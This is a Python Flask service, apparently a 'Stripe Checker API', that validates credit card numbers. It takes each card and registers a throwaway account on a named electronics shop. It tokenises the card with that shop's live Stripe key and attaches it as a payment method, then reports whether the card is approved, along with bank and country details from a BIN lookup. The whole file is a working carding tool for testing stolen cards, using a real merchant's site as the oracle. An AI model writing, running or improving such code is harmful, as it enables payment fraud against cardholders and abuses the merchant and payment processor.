from flask import Flask, request, jsonify
import requests
import re
import random
import string
import logging
import sys

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    stream=sys.stderr
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# The full_stripe_check and get_bin_info functions remain exactly the same as before.
# I am including them here for completeness.

def full_stripe_check(cc, mm, yy, cvv):
    session = requests.Session()
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'referer': 'https://www.ftelettronica.com/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
    })

    if len(yy) == 4:
        yy = yy[-2:]

    try:
        # Step 1 & 2: Get login nonce
        logger.info("Step 1: Fetching login page...")
        login_page_res = session.get('https://www.ftelettronica.com/my-account-2/', timeout=15)
        logger.info(f"Login page status: {login_page_res.status_code}")
        
        # Debug: Check if we got a valid response
        if login_page_res.status_code != 200:
            logger.error(f"Login page failed with status {login_page_res.status_code}")
            return {"status": "Declined", "response": f"Login page returned status {login_page_res.status_code}", "decline_type": "process_error"}
        
        logger.debug(f"Login page length: {len(login_page_res.text)} chars")
        
        login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
        if not login_nonce_match:
            # Try alternative pattern
            logger.warning("Primary nonce pattern failed, trying alternative...")
            login_nonce_match = re.search(r'woocommerce-register-nonce["\s]+value=["\'](.*?)["\']', login_page_res.text)
        
        if not login_nonce_match:
            logger.error("Failed to extract login nonce from page")
            # Save first 500 chars of response for debugging
            logger.debug(f"Page preview: {login_page_res.text[:500]}")
            return {"status": "Declined", "response": "Failed to get login nonce. Site may have changed structure.", "decline_type": "process_error"}
        
        login_nonce = login_nonce_match.group(1)
        logger.info(f"Login nonce extracted: {login_nonce[:10]}...")

        # Step 3: Register a new account for a valid session
        random_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'
        logger.info(f"Step 2: Registering account with email: {random_email}")
        
        register_data = {
            'email': random_email, 
            'password': 'SecurePass' + ''.join(random.choices(string.digits, k=6)) + '!',
            'woocommerce-register-nonce': login_nonce,
            '_wp_http_referer': '/my-account-2/', 
            'register': 'Register',
        }
        reg_response = session.post('https://www.ftelettronica.com/my-account-2/', data=register_data, timeout=15)
        logger.info(f"Registration response status: {reg_response.status_code}")

        # Step 4: Get payment nonce with the valid session
        logger.info("Step 3: Fetching payment method page...")
        payment_page_res = session.get('https://www.ftelettronica.com/my-account-2/add-payment-method/', timeout=15)
        logger.info(f"Payment page status: {payment_page_res.status_code}")
        
        if payment_page_res.status_code != 200:
            logger.error(f"Payment page failed with status {payment_page_res.status_code}")
            return {"status": "Declined", "response": f"Payment page returned status {payment_page_res.status_code}", "decline_type": "process_error"}
        
        logger.debug(f"Payment page length: {len(payment_page_res.text)} chars")
        
        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
        if not payment_nonce_match:
            # Try alternative patterns
            logger.warning("Primary payment nonce pattern failed, trying alternative...")
            payment_nonce_match = re.search(r'createAndConfirmSetupIntentNonce["\s:]+["\'](.*?)["\']', payment_page_res.text)
        
        if not payment_nonce_match:
            logger.error("Failed to extract payment nonce from page")
            # Check if we're logged in by looking for account elements
            if 'my-account' in payment_page_res.url or 'logout' in payment_page_res.text.lower():
                logger.info("Session appears valid (logged in)")
            else:
                logger.warning("May not be logged in - registration might have failed")
            logger.debug(f"Payment page preview: {payment_page_res.text[:500]}")
            return {"status": "Declined", "response": "Failed to get payment nonce. Registration may have failed.", "decline_type": "process_error"}
        
        ajax_nonce = payment_nonce_match.group(1)
        logger.info(f"Payment nonce extracted: {ajax_nonce[:10]}...")

        # Step 5: Get Stripe payment token
        stripe_data = (
            f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}'
            '&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs'
        )
        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data)
        if stripe_response.status_code == 402:
            error_message = stripe_response.json().get('error', {}).get('message', 'Declined by Stripe.')
            return {"status": "Declined", "response": error_message, "decline_type": "card_decline"}
        payment_token = stripe_response.json().get('id')
        if not payment_token:
            return {"status": "Declined", "response": "Failed to retrieve Stripe token.", "decline_type": "process_error"}

        # Step 6: Submit to website
        site_data = {
            'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': payment_token,
            'wc-stripe-payment-type': 'card', '_ajax_nonce': ajax_nonce,
        }
        final_response = session.post('https://www.ftelettronica.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data)
        response_json = final_response.json()

        if "Unable to verify your request" in response_json.get('messages', ''):
             return {"status": "Declined", "response": "Unable to verify request.", "decline_type": "process_error"}
        if response_json.get('success') is False or response_json.get('status') == 'error':
            error_message = (response_json.get('data', {}).get('error', {}).get('message') or
                             re.sub('<[^<]+?>', '', response_json.get('messages', 'Declined by website.')))
            return {"status": "Declined", "response": error_message.strip(), "decline_type": "card_decline"}
        if response_json.get('status') == 'succeeded':
            return {"status": "Approved", "response": "Payment method successfully added.", "decline_type": "none"}
        else:
            return {"status": "Declined", "response": "Unknown response from website.", "decline_type": "process_error"}

    except Exception as e:
        return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}", "decline_type": "process_error"}

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}')
        return response.json() if response.status_code == 200 else {}
    except Exception:
        return {}

# --- Health check endpoint for Wasmer ---
@app.route('/', methods=['GET'])
def health_check():
    return jsonify({"status": "ok", "message": "Stripe Checker API is running"}), 200

# --- NEW API ENDPOINT using GET with URL parameters ---
@app.route('/check', methods=['GET'])
def check_card_endpoint():
    # Get the card details from the URL query parameter `?card=...`
    card_str = request.args.get('card')
    
    if not card_str:
        return jsonify({"error": "Please provide card details using the 'card' parameter in the URL."}), 400

    match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_str)
    if not match:
        return jsonify({"error": "Invalid card format. Use CC|MM|YY|CVV."}), 400

    cc, mm, yy, cvv = match.groups()
    check_result = full_stripe_check(cc, mm, yy, cvv)
    bin_info = get_bin_info(cc[:6])

    final_result = {
        "status": check_result["status"],
        "response": check_result["response"],
        "decline_type": check_result["decline_type"],
        "bin_info": {
            "brand": bin_info.get('brand', 'Unknown'), "type": bin_info.get('type', 'Unknown'),
            "country": bin_info.get('country_name', 'Unknown'), "country_flag": bin_info.get('country_flag', ''),
            "bank": bin_info.get('bank', 'Unknown'),
        }
    }
    return jsonify(final_result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
